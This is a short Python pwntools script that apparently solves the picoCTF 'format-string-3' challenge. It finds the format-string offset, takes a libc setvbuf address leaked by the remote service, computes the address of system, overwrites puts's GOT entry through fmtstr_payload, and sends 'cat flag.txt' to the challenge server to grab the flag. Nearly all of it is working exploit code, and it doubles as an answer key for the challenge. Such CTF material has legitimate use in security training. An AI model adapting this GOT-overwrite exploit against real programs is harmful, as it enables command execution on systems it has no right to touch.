from pwn import *

context.log_level = 69
context.binary = ("./format-string-3")

############################################################
## FINDING THE OFFSET OF OUR PAYLOAD IN THE FORMAT STRING ##
############################################################

# Function called in order to send a payload
def send_payload(payload):
    target = process("./format-string-3")
    target.sendline(payload)
    return target.recvall()

# Figure out the format of the vulnerable printf
fsv = FmtStr(execute_fmt=send_payload)
offset = fsv.offset
print("Offset: " + str(offset))

##########################################################
##########################################################
##########################################################

target = remote("rhea.picoctf.net", 53282)

# Extract all the info we need from the setvbuf leak
target.recvuntil(b'libc: ')
setvbuf = int(target.recvline(keepends=False), 16)
systemAddr = setvbuf-0x2ac90

# No PIE, so this is static across all runs
putsGOT = 0x404018

# Write the address of system into the GOT entry for puts!
payload = fmtstr_payload(offset, {putsGOT : systemAddr})
target.sendline(payload)
target.sendline(b'cat flag.txt')
print(target.recvuntil(b'}'))